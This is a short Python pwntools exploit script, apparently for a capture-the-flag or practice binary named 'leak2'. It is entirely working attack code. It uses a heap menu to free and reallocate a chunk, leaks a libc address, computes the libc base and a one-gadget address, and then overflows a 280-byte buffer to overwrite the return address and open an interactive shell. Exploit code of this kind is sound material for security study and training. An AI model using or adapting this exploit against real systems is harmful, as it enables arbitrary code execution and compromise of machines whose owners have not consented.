# leak2.py
from pwn import *
p = process("./leak2")

def add(data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx, data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendlineafter(":",str(data))
def show(idx):
	print p.sendlineafter(">","4")
	print p.sendlineafter(":",str(idx))
def overflow(data):
	print p.sendlineafter(">","5")
	print p.sendlineafter("",str(data))

add("AAAA") # 0
add("AAAA") # 1
pause()
free(0)
pause()
add("") # 2
pause()
show(2)

print p.recvuntil("data: ")
libc = u64(p.recv(6).ljust(8,"\x00"))
libc_base = libc - 0x3c4b0a
oneshot = libc_base + 0x45216

print hex(libc_base)
overflow("A"*280 + p64(oneshot))
p.interactive()